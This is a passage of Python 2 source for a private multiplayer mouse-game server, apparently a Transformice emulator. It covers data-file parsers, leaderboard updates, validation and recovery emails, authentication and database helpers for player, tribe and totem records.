         'saves': '',
         'cheese': '',
         'first': ''}
        self.updateModeratorOnlineTime = reactor.callLater(5, self.verifyIsModOnline)
        self.updatePlayerClassementTimer = reactor.callLater(5, self.updatePlayerClassement)
        self.PlayerCountHistory = ['0'] * 200
        if datetime.now().minute == 0 or datetime.now().minute == 10 or datetime.now().minute == 20 or datetime.now().minute == 30 or datetime.now().minute == 40 or datetime.now().minute == 50:
            self.updatePlayerCountHistoryTimer = reactor.callLater(60, self.updatePlayerCountHistory)
        elif datetime.now().minute >= 1 and datetime.now().minute <= 9:
            minutetime = datetime.now().minute
            timeleft = 10 - minutetime
            self.updatePlayerCountHistoryTimer = reactor.callLater(timeleft * 60, self.updatePlayerCountHistory)
        elif datetime.now().minute >= 11 and datetime.now().minute <= 19:
            minutetime = datetime.now().minute
            timeleft = 20 - minutetime
            self.updatePlayerCountHistoryTimer = reactor.callLater(timeleft * 60, self.updatePlayerCountHistory)
        elif datetime.now().minute >= 21 and datetime.now().minute <= 29:
            minutetime = datetime.now().minute
            timeleft = 30 - minutetime
            self.updatePlayerCountHistoryTimer = reactor.callLater(timeleft * 60, self.updatePlayerCountHistory)
        elif datetime.now().minute >= 31 and datetime.now().minute <= 39:
            minutetime = datetime.now().minute
            timeleft = 40 - minutetime
            self.updatePlayerCountHistoryTimer = reactor.callLater(timeleft * 60, self.updatePlayerCountHistory)
        elif datetime.now().minute >= 41 and datetime.now().minute <= 49:
            minutetime = datetime.now().minute
            timeleft = 50 - minutetime
            self.updatePlayerCountHistoryTimer = reactor.callLater(timeleft * 60, self.updatePlayerCountHistory)
        elif datetime.now().minute >= 51 and datetime.now().minute <= 59:
            minutetime = datetime.now().minute
            timeleft = 60 - minutetime
            self.updatePlayerCountHistoryTimer = reactor.callLater(timeleft * 60, self.updatePlayerCountHistory)
        else:
            self.updatePlayerCountHistoryTimer = reactor.callLater(60, self.updatePlayerCountHistory)
        self.OutputConn = None
        self.textToolsSiteList = self.getTextDictList('siteslist')
        self.parseNpcFile()
        self.parseSpmFile()
        self.parseRoomFile()
        self.parseShopFile()
        self.parseShamanShopFile()
        self.parseTribulleBaseFile()
        self.GameAPIModuleRooms = {}
        self.rooms = {}
        self.lastGiftID = 0
        self.gifts = {}
        return

    def doSaveTextDictList(self, file):
        _x = './addons/dicts/%s.json'
        with open(_x % file, 'wb') as files:
            json.dump(self.textToolsSiteList, files, indent=6)

    def getTextDictList(self, file):
        _x = './addons/dicts/%s.json'
        rdata = open(_x % file, 'r')
        _d = rdata.read()
        rdata.close()
        return ast.literal_eval(_d)

    def checkIfModOnlines(self):
        for langue, players in self.ModList.items():
            if len(players) > 0:
                pass
            else:
                del self.ModList[langue]

    def updateModoPwet(self, cmm):
        for room in self.rooms.values():
            for playerCode, client in room.clients.items():
                if client.privilegeLevel >= 5:
                    if not client.modoPwet:
                        if cmm == ord(client.LangueByte):
                            client.ModopwetModule.sendNewReportAlert()
                    else:
                        client.ModopwetModule.openModoPwet()

    def updateStatusModoPwet(self, name, status, arg1 = None, arg2 = None, arg3 = None, arg4 = None):
        for room in self.rooms.values():
            for playerCode, client in room.clients.items():
                if client.modoPwet:
                    if client.privilegeLevel >= 5:
                        client.ModopwetModule.changeReportStatus(name, status, arg1, arg2, arg3, arg4)

    def sendEventMapAll(self, time, loop = False):
        for room in self.rooms.values():
            if not room.isRacing or not room.isBootcamp or not room.isSurvivoris or not room.Defilante or not room.isTribehouse:
                if not room.RunEvent:
                    room.RunEvent = True

        if loop:
            if self.timeEvent:
                try:
                    self.timeEvent.cancel()
                except:
                    self.timeEvent = None

            self.timeEvent = reactor.callLater(time, self.sendEventMapAll, True)
        return

    def sendValidationEmail(self, code, lang, address, msgtype, senderClient = None):
        SERVER = self.EmailServerAddr
        FROM = '{name} <{adrs}>'.format(name=NAMESERVER, adrs=self.EmailServerName)
        TO = ['{adrs}'.format(adrs=address)]
        SUBJECT = 'Email validation'
        TEXT = 'In order to validate this email adress, copy-paste this code in the game : <h1>' + str(code) + '</h1>'
        if msgtype == 2:
            TEXT = 'A PASSWORD CHANGE HAS BEEN REQUESTED.\r\n' + TEXT
        message = 'From: %s\r\nTo: %s\r\nMIME-Version: 1.0\r\nContent-type: text/html\r\nSubject: %s\r\n\r\n%s' % (FROM,
         ', '.join(TO),
         SUBJECT,
         TEXT)
        if self.EmailServerSSL:
            server = smtplib.SMTP_SSL(SERVER, self.EmailServerPort)
        else:
            server = smtplib.SMTP(SERVER, self.EmailServerPort)
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(self.EmailServerName, self.EmailServerPass)
        server.sendmail(FROM, TO, message)
        server.close()

    def sendRecoveryEmail(self, code, address, senderClient = None):
        SERVER = self.EmailServerAddr
        FROM = '{name} <{adrs}>'.format(name=NAMESERVER, adrs=self.EmailServerName)
        TO = ['{adrs}'.format(adrs=address)]
        SUBJECT = '[{name}] Password recovery'.format(name=NAMESERVER)
        TEXT = 'To retrieve your password, copy and paste the following code in game : <h1>' + str(code) + '</h1>'
        message = 'From: %s\r\nTo: %s\r\nMIME-Version: 1.0\r\nContent-type: text/html\r\nSubject: %s\r\n\r\n%s' % (FROM,
         ', '.join(TO),
         SUBJECT,
         TEXT)
        if self.EmailServerSSL:
            server = smtplib.SMTP_SSL(SERVER, self.EmailServerPort)
        else:
            server = smtplib.SMTP(SERVER, self.EmailServerPort)
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(self.EmailServerName, self.EmailServerPass)
        server.sendmail(FROM, TO, message)
        server.quit()

    def updatePlayerClassement(self):
        UserSavesList = []
        self.Database.execute('select name, saves from users where privlevel != 10 ORDER BY saves DESC')
        rrfRows = self.Database.fetchall()
        if rrfRows is None:
            pass
        else:
            for rrf in rrfRows:
                UserSavesList.append(rrf)
            else:
                rrfRows = None

        UserCheeseList = []
        self.Database.execute('select name, cheese from users where privlevel != 10 ORDER BY cheese DESC')
        rrfRows = self.Database.fetchall()
        if rrfRows is None:
            pass
        else:
            for rrf in rrfRows:
                UserCheeseList.append(rrf)
            else:
                rrfRows = None

        UserFirstsList = []
        self.Database.execute('select name, first from users where privlevel != 10 ORDER BY first DESC')
        rrfRows = self.Database.fetchall()
        if rrfRows is None:
            pass
        else:
            for rrf in rrfRows:
                UserFirstsList.append(rrf)
            else:
                rrfRows = None

        SaveList = {}
        CheeseList = {}
        FirstList = {}
        SaveListDisp = []
        CheeseListDisp = []
        FirstListDisp = []
        if len(UserFirstsList) < 10 and len(UserCheeseList) < 10 and len(UserSavesList) < 10:
            classementCount = len(UserFirstsList)
        else:
            classementCount = 10
        for user in UserSavesList:
            SaveList[user[0]] = user[1]
        else:
            UserSavesList = []

        for user in UserCheeseList:
            CheeseList[user[0]] = user[1]
        else:
            UserCheeseList = []

        for user in UserFirstsList:
            FirstList[user[0]] = user[1]
        else:
            UserFirstsList = []

        for x in range(classementCount):
            try:
                mSL = max(SaveList.iterkeys(), key=lambda k: SaveList[k])
                SaveListDisp.append([x, mSL, SaveList[mSL]])
                del SaveList[mSL]
            except:
                pass

        else:
            SaveList = {}

        for x in range(classementCount):
            try:
                mSL = max(CheeseList.iterkeys(), key=lambda k: CheeseList[k])
                CheeseListDisp.append([x, mSL, CheeseList[mSL]])
                del CheeseList[mSL]
            except:
                pass

        else:
            CheeseList = {}

        for x in range(classementCount):
            try:
                mSL = max(FirstList.iterkeys(), key=lambda k: FirstList[k])
                FirstListDisp.append([x, mSL, FirstList[mSL]])
                del FirstList[mSL]
            except:
                pass

        else:
            FirstList = {}

        ListSaves = ''
        ListCheese = ''
        ListFirst = ''
        count = 1
        for x in range(classementCount):
            try:
                if count in (1, 2, 3):
                    if SaveListDisp[x][1] in self.RankList['users']:
                        self.RankList['users'][SaveListDisp[x][1]]['S'] = x
                    else:
                        self.RankList['users'][SaveListDisp[x][1]] = {}
                        self.RankList['users'][SaveListDisp[x][1]]['S'] = x
                count += 1
                if ListSaves == '':
                    ListSaves += ','.join(map(str, [SaveListDisp[x][1], self.getCurrentTitle(str(SaveListDisp[x][1])), SaveListDisp[x][2]]))
                else:
                    ListSaves += ',' + ','.join(map(str, [SaveListDisp[x][1], self.getCurrentTitle(str(SaveListDisp[x][1])), SaveListDisp[x][2]]))
            except:
                pass

        else:
            SaveListDisp = []

        count = 1
        for x in range(classementCount):
            try:
                if count in (1, 2, 3):
                    if CheeseListDisp[x][1] in self.RankList['users']:
                        self.RankList['users'][CheeseListDisp[x][1]]['C'] = x
                    else:
                        self.RankList['users'][CheeseListDisp[x][1]] = {}
                        self.RankList['users'][CheeseListDisp[x][1]]['C'] = x
                count += 1
                if ListCheese == '':
                    ListCheese += ','.join(map(str, [CheeseListDisp[x][1], self.getCurrentTitle(str(CheeseListDisp[x][1])), CheeseListDisp[x][2]]))
                else:
                    ListCheese += ',' + ','.join(map(str, [CheeseListDisp[x][1], self.getCurrentTitle(str(CheeseListDisp[x][1])), CheeseListDisp[x][2]]))
            except:
                pass

        else:
            CheeseListDisp = []

        count = 1
        for x in range(classementCount):
            try:
                if count in (1, 2, 3):
                    if FirstListDisp[x][1] in self.RankList['users']:
                        self.RankList['users'][FirstListDisp[x][1]]['F'] = x
                    else:
                        self.RankList['users'][FirstListDisp[x][1]] = {}
                        self.RankList['users'][FirstListDisp[x][1]]['F'] = x
                count += 1
                if ListFirst == '':
                    ListFirst += ','.join(map(str, [FirstListDisp[x][1], self.getCurrentTitle(str(FirstListDisp[x][1])), FirstListDisp[x][2]]))
                else:
                    ListFirst += ',' + ','.join(map(str, [FirstListDisp[x][1], self.getCurrentTitle(str(FirstListDisp[x][1])), FirstListDisp[x][2]]))
            except:
                pass

        else:
            FirstListDisp = []

        count = 0
        self.RankList['saves'] = ListSaves
        self.RankList['cheese'] = ListCheese
        self.RankList['first'] = ListFirst
        try:
            ListFirst = ''
            ListCheese = ''
            ListFirst = ''
        except:
            pass

        self.updatePlayerClassementTimer = reactor.callLater(300, self.updatePlayerClassement)
        return

    def updatePlayerCountHistory(self):
        if self.PlayerCountHistory:
            self.PlayerCountHistory.remove(self.PlayerCountHistory[0])
            self.PlayerCountHistory.append(str(self.getConnectedPlayerCount()))
            self.updatePlayerCountHistoryTimer = reactor.callLater(600, self.updatePlayerCountHistory)

    def getLsEquipe(self, senderClient):
        for room in self.rooms.values():
            for playerCode, client in room.clients.items():
                if client.privilegeLevel in (10,):
                    name = 'Servidor'
                    message = client.username + ' : Administrador'
                    senderClient.sendData('\x1a\x05', [name, message])
                if client.privilegeLevel in (8,):
                    name = 'Servidor'
                    message = client.username + ' : Coordenador'
                    senderClient.sendData('\x1a\x05', [name, message])
                if client.privilegeLevel in (6,):
                    name = 'Servidor'
                    message = client.username + ' : Mega Moderador'
                    senderClient.sendData('\x1a\x05', [name, message])
                if client.privilegeLevel in (5,):
                    name = 'Servidor'
                    message = client.username + ' : Moderador'
                    senderClient.sendData('\x1a\x05', [name, message])
                if client.privilegeLevel in (4,):
                    name = 'Servidor'
                    message = client.username + ' : MapCrew'
                    senderClient.sendData('\x1a\x06', [name, message])
                if client.privilegeLevel in (3,):
                    name = 'Servidor'
                    message = client.username + ' : Helper'
                    data = '\x07' + struct.pack('!h', len(name)) + name + struct.pack('!h', len(message)) + message + '\x00\x00'
                    senderClient.sendData('\x06\n', data, True)

    def reloadModuleCodes(self, super = None, module = None, console = False):
        countWork = 0
        countTotal = 0
        if module in ('0', 'ALL'):
            modSname = 'Package.Tokensbase.ParseBase'
            try:
                countTotal += 1
                import Package.Tokensbase
                reload(Tokensbase)
                from Package.Tokensbase import Tokenbase
                self.ParseBase = Tokenbase()
                super.sendData('\x06\x14', ['[<V>OK<BL>] Module: <B>{0}</B> has been successfully reloaded!'.format(modSname)])
                countWork += 1
            except Exception as err:
                print err
                if not console:
                    super.sendData('\x06\x14', ['[<R>FAIL<BL>] Module: <B>{0}</B> had failed to reload.'.format(modSname)])

        if module in ('7', 'ALL'):
            modSname = 'Package.CommandsPackage.Commands'
            try:
                countTotal += 1
                from Package.CommandsPackage import Commands
                reload(Commands)
                from Package.CommandsPackage import Commands
                for room in self.rooms.values():
                    for client in room.clients.values():
                        client.ParseCommand = Commands.parseCommand(client)

                super.sendData('\x06\x14', ['[<V>OK<BL>] Module: <B>{0}</B> has been successfully reloaded!'.format(modSname)])
                countWork += 1
            except Exception as err:
                print err
                super.sendData('\x06\x14', ['[<R>FAIL<BL>] Module: <B>{0}</B> had failed to reload.'.format(modSname)])

        if not console:
            super.sendData('\x06\x14', ['[%s] %d/%d modules reloaded successfully.' % (super.username, countWork, countTotal)])
        else:
            print '[%s] %d/%d modules reloaded successfully.' % ('Console', countWork, countTotal)

    def refreshSettings(self):
        self.ServerID = str(self.getServerSetting('ServerID'))
        self.Owner = str(self.getServerSetting('Owner'))
        self.Key = str(self.getServerSetting('Key'))
        self.POLICY = str(self.getServerSetting('Policy'))
        self.PORT = str(self.getServerSetting('PolicyPorts'))
        self.LCDMT = str(self.getServerSetting('LCDMT'))
        self.LoaderURL = str(self.getServerSetting('LoaderURL'))
        self.LoaderSize = int(self.getServerSetting('LoaderSize'))
        self.ModLoaderSize = int(self.getServerSetting('ModLoaderSize'))
        self.ClientSize = int(self.getServerSetting('ClientSize'))
        self.ValidateLoader = self.str2bool(self.getServerSetting('ValidateLoader'))
        self.ValidateVersion = self.str2bool(self.getServerSetting('ValidateVersion'))
        self.GetCapabilities = self.str2bool(self.getServerSetting('GetClientCapabilities'))
        self.MaxBinaryLength = int(self.getServerSetting('MaxBinaryLength'))
        self.MinBinaryLength = int(self.getServerSetting('MinBinaryLength'))
        self.MaxUTFLength = int(self.getServerSetting('MaxUTFLength'))
        self.MinUTFLength = int(self.getServerSetting('MinUTFLength'))
        self.EditorShopCheese = int(self.getServerSetting('EditeurShopCheese'))
        self.EditeurCheese = int(self.getServerSetting('EditeurCheese'))
        self.TribuShopCheese = int(self.getServerSetting('TribuShopCheese'))
        self.EmailServerAddr = str(self.getServerSetting('EmailServerAddr'))
        self.EmailServerPort = int(self.getServerSetting('EmailServerPort'))
        self.EmailServerName = str(self.getServerSetting('EmailServerName'))
        self.EmailServerPass = str(self.getServerSetting('EmailServerPass'))
        self.BaseForumURL = str(self.getServerSetting('BaseForumURL'))
        self.BaseAvatarURL = str(self.getServerSetting('BaseAvatarURL'))
        self.MinMiceExp = str(self.getServerSetting('MinMiceExp'))
        self.MinMiceFirst = str(self.getServerSetting('MinMiceFirst'))
        self.MinMiceBootcount = str(self.getServerSetting('MinMiceBootcount'))
        self.DisableTribulle = self.str2bool(self.getServerSetting('DisableTribulle'))

    def parseShamanShopFile(self):
        DefaultShamanShop = '101,5,1500,50'
        if os.path.exists('./addons/shop/shaman.txt'):
            SFile = open('./addons/shop/shaman.txt', 'rb')
            SData = SFile.read()
            SFile.close()
            self.shamanShopList = SData
        else:
            print str(datetime.today()) + ' ' + '[Serveur] Could not find Shaman Shop file. [#02]'
            self.shamanShopList = DefaultShamanShop
        self.itemcatshamshop = {}
        for Value in self.shamanShopList.split(';'):
            item, new, custom, cheese, fraise = Value.split(',')
            if cheese == str(1000000):
                pass
            elif int(custom) in range(0, 10):
                self.itemcatshamshop[str(item)] = (int(custom), int(cheese), int(fraise))

    def parseTribulleBaseFile(self):
        if os.path.exists('./Data/tribulle/tribulle.json'):
            SFile = open('./Data/tribulle/tribulle.json', 'rb')
            SData = ast.literal_eval(SFile.read())
            SFile.close()
            self.TribulleBase = SData
        else:
            print str(datetime.today()) + ' ' + '[Serveur] Could not find Shop file. [#01]'
            self.TribulleBase = {}

    def parseShopFile(self):
        DefaultShop = '0,3,1,0,20,0'
        if os.path.exists('./addons/shop/shop.txt'):
            SFile = open('./addons/shop/shop.txt', 'rb')
            SData = SFile.read()
            SFile.close()
            self.shopList = SData
        else:
            print str(datetime.today()) + ' ' + '[Serveur] Could not find Shop file. [#01]'
            self.shopList = DefaultShop
        self.itemcatshop = {}
        for Value in self.shopList.split(';'):
            Cate, Item, new, Customizable, Coin, Price, Fraises = Value.split(',')
            if Price == str(1000000 + int(Coin)):
                pass
            elif int(Cate) in range(0, 10) + [21, 22]:
                self.itemcatshop[str(Cate) + '|' + str(Item)] = (int(Coin), int(Price), int(Fraises))

    def parseRoomFile(self):
        if os.path.exists('./others/spr.dat'):
            SPR = []
            SPRD = []
            RFile = open('./others/spr.dat', 'rb')
            RData = RFile.read()
            RFile.close()
            if RData[:3] == 'SPR':
                RCount = struct.unpack('!h', RData[3:5])[0]
                RData = RData[6:]
                x = 1
                while x <= RCount:
                    countID = struct.unpack('!l', RData[:4])[0]
                    if countID == x:
                        x = x + 1
                        RData = RData[4:]
                        Name = RData[2:struct.unpack('!h', RData[:2])[0] + 2]
                        RData = RData[struct.unpack('!h', RData[:2])[0] + 2:]
                        stats, spcm, sndbx, type, mapnum, atr, tme, n20s, eSync, sSync, sNP, sT, sc0, plimit = struct.unpack('!???bi?i????h?B', RData[:21])
                        RData = RData[21:]
                        SPR.append(Name)
                        SPRD.append([Name,
                         stats,
                         spcm,
                         sndbx,
                         type,
                         mapnum,
                         atr,
                         tme,
                         n20s,
                         eSync,
                         sSync,
                         sNP,
                         sT,
                         sc0,
                         plimit])
                    else:
                        print str(datetime.today()) + ' ' + '[Serveur] Error parsing Rooms file. [4285]'
                        self.SPR = []
                        self.SPRD = []
                        return False

                self.SPR = SPR
                self.SPRD = SPRD
                return True
            else:
                print str(datetime.today()) + ' ' + '[Serveur] Error parsing Rooms file. [4290]'
                self.SPR = []
                self.SPRD = []
                return False
        else:
            print str(datetime.today()) + ' ' + '[Serveur] Could not find Rooms file. [4295]'
            self.SPR = []
            self.SPRD = []
            return False

    def parseSpmFile(self):
        if os.path.exists('./others/spm.dat'):
            SPM = []
            SPMmaps = []
            spmFile = open('./others/spm.dat', 'rb')
            spmData = spmFile.read()
            spmFile.close()
            if spmData[:3] == 'SPM':
                spmCount = struct.unpack('!h', spmData[3:5])[0]
                spmData = spmData[6:]
                x = 1
                while x <= spmCount:
                    countID = struct.unpack('!l', spmData[:4])[0]
                    if countID == x:
                        spmData = spmData[4:]
                        code, authorlength = struct.unpack('!hh', spmData[:4])
                        author = spmData[4:4 + authorlength]
                        spmData = spmData[4 + authorlength:]
                        xmllength = struct.unpack('!h', spmData[:2])[0]
                        xml = spmData[2:2 + xmllength]
                        spmData = spmData[2 + xmllength:]
                        SPM.append([code, author, xml])
                        SPMmaps.append(code)
                        x += 1
                    else:
                        print str(datetime.today()) + ' ' + '[Serveur] Error parsing theSPM file.'
                        self.SPM = SPM
                        self.SPMmaps = SPMmaps
                        return False

                self.SPM = SPM
                self.SPMmaps = SPMmaps
            else:
                print str(datetime.today()) + ' ' + '[Serveur] Error parsing theSPM file.'
                self.SPM = SPM
                self.SPMmaps = SPMmaps
                return False
        else:
            print str(datetime.today()) + ' ' + '[Serveur] Could not find SPM file.'
            self.SPM = []
            self.SPMmaps = []

    def parseNpcFile(self):
        if os.path.exists('./others/npc.dat'):
            NPCs_R = []
            NPCs_M = []
            NPCRooms = []
            NPCMaps = []
            npcFile = open('./others/npc.dat', 'rb')
            npcData = npcFile.read()
            npcFile.close()
            if npcData[:3] == 'NPC':
                npcCount = struct.unpack('!h', npcData[3:5])[0]
                npcData = npcData[6:]
                x = 1
                while x <= npcCount:
                    countID, Type, ExVars = struct.unpack('!l??', npcData[:6])
                    if countID == x:
                        npcEx = []
                        npcData = npcData[6:]
                        npcID = struct.unpack('!h', npcData[:2])[0]
                        npcName = npcData[4:struct.unpack('!h', npcData[2:4])[0] + 4]
                        npcData = npcData[struct.unpack('!h', npcData[2:4])[0] + 4:]
                        npcShop = npcData[2:struct.unpack('!h', npcData[:2])[0] + 2]
                        npcData = npcData[struct.unpack('!h', npcData[:2])[0] + 2:]
                        npcX, npcY, npcDirection, npcClick = struct.unpack('!hhbb', npcData[:6])
                        npcData = npcData[6:]
                        if Type:
                            npcRoom = npcData[2:struct.unpack('!h', npcData[:2])[0] + 2]
                            if npcRoom not in NPCRooms:
                                NPCRooms.append(npcRoom)
                            npcData = npcData[struct.unpack('!h', npcData[:2])[0] + 2:]
                        else:
                            npcMap = struct.unpack('!h', npcData[:2])[0]
                            if npcMap not in NPCMaps:
                                NPCMaps.append(npcMap)
                            npcData = npcData[2:]
                        if ExVars:
                            npcExA = True
                            number = struct.unpack('!h', npcData[:2])[0]
                            npcData = npcData[2:]
                            while number > 0:
                                npcExET = npcData[2:struct.unpack('!h', npcData[:2])[0] + 2]
                                npcData = npcData[struct.unpack('!h', npcData[:2])[0] + 2:]
                                npcExData = npcData[2:struct.unpack('!h', npcData[:2])[0] + 2]
                                npcData = npcData[struct.unpack('!h', npcData[:2])[0] + 2:]
                                number = number - 1
                                npcEx.append([npcExET, npcExData])

                        if Type:
                            NPCs_R.append([npcID,
                             npcName,
                             npcShop,
                             npcX,
                             npcY,
                             npcDirection,
                             npcClick,
                             npcRoom,
                             ExVars,
                             npcEx])
                        else:
                            NPCs_M.append([npcID,
                             npcName,
                             npcShop,
                             npcX,
                             npcY,
                             npcDirection,
                             npcClick,
                             npcMap,
                             ExVars,
                             npcEx])
                    else:
                        print str(datetime.today()) + ' ' + '[Serveur] Error parsing NPC file.'
                        NPCRooms = []
                        NPCMaps = []
                        NPCs_R = []
                        NPCs_M = []
                        return False
                        break
                    x = x + 1

                self.NPCRooms = NPCRooms
                self.NPCMaps = NPCMaps
                self.NPCs_R = NPCs_R
                self.NPCs_M = NPCs_M
            else:
                self.NPCRooms = NPCRooms
                self.NPCMaps = NPCMaps
                self.NPCs_R = NPCs_R
                self.NPCs_M = NPCs_M
                return False
        else:
            print str(datetime.today()) + ' ' + '[Serveur] Could not find NPC file.'
            self.NPCRooms = []
            self.NPCMaps = []
            self.NPCs_R = []
            self.NPCs_M = []
            return False

    def serverChatsChannel(self, name):
        self.Database.execute('select * from chats where name = ?', [name])
        rrf = self.Database.fetchone()
        if rrf is None:
            return False
        else:
            return rrf
            return

    def giveShopCheese(self, senderClient, username, amount):
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == username:
                    player.shopcheese = player.shopcheese + int(amount)
                    player.sendAnimZelda(player.playerCode, -1, 0)
                    self.sendModChat(self, '\x06\x14', [senderClient.username + ' Doou ' + str(amount) + ' Queijos Para ' + player.username], False)

    def giveShopFraises(self, senderClient, username, amount):
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == username:
                    player.shopfraises = player.shopfraises + int(amount)
                    player.sendData('\x0c\x14', struct.pack('!h', int(amount)), True)
                    self.sendModChat(self, '\x06\x14', [senderClient.username + ' Doou ' + str(amount) + ' Morangos Para ' + player.username], False)

    def giveShopCoins(self, senderClient, username, amount):
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == username:
                    player.shopcoins = player.shopcoins + int(amount)
                    self.sendModChat(self, '\x06\x14', [senderClient.username + ' Doou ' + str(amount) + ' Coins Para ' + player.username], False)

    def authenticate(self, username, passwordHash):
        CheckFail = 0
        if len(username) > 12:
            CheckFail = 1
        if not username.isalpha():
            CheckFail = 1
        if CheckFail == 0:
            username = username.lower().capitalize()
            self.Database.execute('select name, password, privlevel, passwordHash from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            name = rrf[0]
            password = rrf[1]
            privlevel = rrf[2]
            passHash = rrf[3]
            if passwordHash != passHash:
                return -1
            else:
                return privlevel
        return

    def getAllPlayerData(self, username):
        if username.startswith('*'):
            return ['Souris',
             '',
             0,
             0,
             0,
             0,
             0,
             0,
             0,
             '["0"]',
             '',
             0,
             '',
             '',
             '1;0,0,0,0,0,0',
             0,
             0,
             0,
             0,
             '',
             '',
             '',
             '',
             '',
             0,
             0,
             '',
             'None',
             'None',
             0,
             '']
        else:
            self.Database.execute('select * from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf
            return

    def getInventori(self):
            data = ""
            list = "1011,3,1,1,0,1,0;1010,3,1,1,0,1,0;1111,3,1,1,0,1,0;1110,3,1,1,0,1,0;1211,3,1,1,0,1,0;1210,3,1,1,0,1,0;1311,3,1,1,0,1,0;1310,3,1,1,0,1,0;1411,3,1,1,0,1,0;1410,3,1,1,0,1,0;1911,3,1,1,0,1,0;1910,3,1,1,0,1,0;1811,3,1,1,0,1,0;1810,3,1,1,0,1,0;1711,3,1,1,0,1,0;1710,3,1,1,0,1,0;1511,3,1,1,0,1,0;1510,3,1,1,0,1,0;1610,2,1,1,0,1,0;1611,2,1,0,0,1,0"
            list += ";1,"+str(self.numberofnewpowers[0])+",0,1,1,1,0;2,"+str(self.numberofnewpowers[1])+",0,1,1,1,0;3,"+str(self.numberofnewpowers[2])+",0,1,1,1,0;4,"+str(self.numberofnewpowers[3])+",0,1,1,1,0;5,"+str(self.numberofnewpowers[4])+",0,1,1,1,0"
            invent = list.split(";")
            data = data + struct.pack("!h", len(invent))
            for x in invent:
                item, quant,select, byte1, equipe, byte4, byte5=map(int, x.split(","))
                data = data + struct.pack("!hbbbbbb", item, quant, select, byte1,equipe,byte4,byte5)
            self.sendData("\x1f\x01" + data, [], True)

    def getApiPlayerData(self, username):
        self.Database.execute('select id, rounds, privlevel, saves, cheese, first, bootcamp, currenttitle, HardModeSaves, shamcheese from users where name = ?', [username])
        rrf = self.Database.fetchone()
        if rrf is None:
            return -1
        else:
            return rrf
            return

    def mouseColorInfo(self, direction, name, info):
        if direction == True:
            if name.startswith('*'):
                return ['', '']
            else:
                self.Database.execute('select ColorInfo from users where name = ?', [name])
                rrf = self.Database.fetchone()
                if rrf is None:
                    return []
                result = list(rrf[:])
                result = str(result[0]).split('#')
                return result
        elif direction == False:
            info = '#'.join(map(str, info))
            self.Database.execute('UPDATE users SET ColorInfo = ? WHERE name = ?', [info, name])
        return

    def getPlayerLevelData(self, get, username, info = None):
        if username.startswith('*'):
            return [1, 0, 0]
        else:
            if get:
                self.Database.execute('select skillsData from users where name = ?', [username])
                rrf = self.Database.fetchone()
                if rrf is None:
                    return [1, 0, 32]
                else:
                    return rrf[0].rsplit('#', 2)
            elif not get:
                data = '#'.join(map(str, info))
                self.Database.execute('UPDATE users SET skillsData = ? WHERE name = ?', [data, username])
            return
            return

    def getPlayerSkillsData(self, username):
        if username.startswith('*'):
            return ''
        else:
            self.Database.execute('select skills from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return ''
            return str(rrf[0])
            return

    def sendTribeInfoPlayer(self, code, rank):
        self.Database.execute('select informations from tribu where id = ?', [code])
        rrf = self.Database.fetchone()
        if rrf is None:
            return ['0',
             '0',
             '0',
             '0',
             '0',
             '0',
             '0',
             '0',
             '0',
             '0',
             '0']
        else:
            rankings = rrf.split(';')
            for r in rankings:
                name, rid, position, perm, remove = r.split('#')
                if str(rank) in [rid]:
                    return str(perm).split(',')

            return ['0',
             '0',
             '0',
             '0',
             '0',
             '0',
             '0',
             '0',
             '0',
             '0',
             '0']
            return

    def getTribeData(self, code):
        self.Database.execute('select * from tribu where id = ?', [code])
        rrf = self.Database.fetchone()
        if rrf is None:
            return -1
        else:
            return rrf
            return

    def getTribeCode(self, name):
        self.Database.execute('select id from Tribu where name = ?', [name])
        rrf = self.Database.fetchone()
        if rrf is None:
            return -1
        else:
            return rrf
            return

    def getTotemData(self, name):
        if name.startswith('*'):
            return -1
        elif len(name) < 3 or len(name) > 12:
            return -1
        else:
            self.Database.execute('select * from Totem where name = ?', [name])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            result = list(rrf[:])
            result[2] = str(result[2]).replace('%', '\x01')
            return result
            return

    def setTotemData(self, name, itemcount, totem):
        if name.startswith('*'):
            return -1
        if len(name) < 3 or len(name) > 12:
            return -1
        totem = totem.replace('\x01', '%')
        if self.getTotemData(name) != -1:
            self.Database.execute('UPDATE Totem SET itemcount = ?, totem = ? WHERE name = ?', [int(itemcount), totem, name])
        else:
            self.Database.execute('insert into Totem (name, itemcount, totem) values (?, ?, ?)', (name, int(itemcount), totem))

    def updateSkillsRedistribute(self, username, time):
        self.Database.execute('UPDATE users SET skillsRedistribute = ? WHERE name = ?', [time, username])

    def updateSkills(self, username, skills):
        if username.startswith('*'):
            return -1
        self.Database.execute('UPDATE users SET skills = ? WHERE name = ?', [skills, username])

    def getServerSetting(self, setting):
        self.Database.execute('select value from settings where setting = ?', [setting])
        rrf = self.Database.fetchone()
        if rrf is None:
            return False
        else:
            return rrf[0]
            return

    def str2bool(self, string):
        return string.lower() in ('yes', 'true', 't', '1', 'on')

    def getPlayerID(self, username):
        if username.startswith('*'):
            return '1'
        else:
            self.Database.execute('select playerid from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getGenderProfile(self, username):
        if username.startswith('*'):
            return 0
        else:
            self.Database.execute('select gender from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return 0
            if rrf[0] == 'None':
                return 0
            return rrf[0]
            return

    def getDateProfile(self, username):
        if username.startswith('*'):
            return 0
        else:
            self.Database.execute('select date from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            if rrf[0] == 'None':
                return '1341865220'
            return rrf[0]
            return

    def getPlayerRedistribute(self, username):
        if username.startswith('*'):
            return 0
        else:
            self.Database.execute('select skillsRedistribute from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return 0
            return int(rrf[0])
            return

    def mouseVisualsInfo(self, username, info):
        if username.startswith('*'):
            return -1
        self.Database.execute('UPDATE users SET visuals = ? WHERE name = ?', [info, username])

    def mouseItensShaman(self, username, itens):
        if username.startswith('*'):
            return -1
        self.Database.execute('UPDATE users SET itensSham = ? WHERE name = ?', [str(itens), username])

    def mouseShamanItens(self, username, itens):
        if username.startswith('*'):
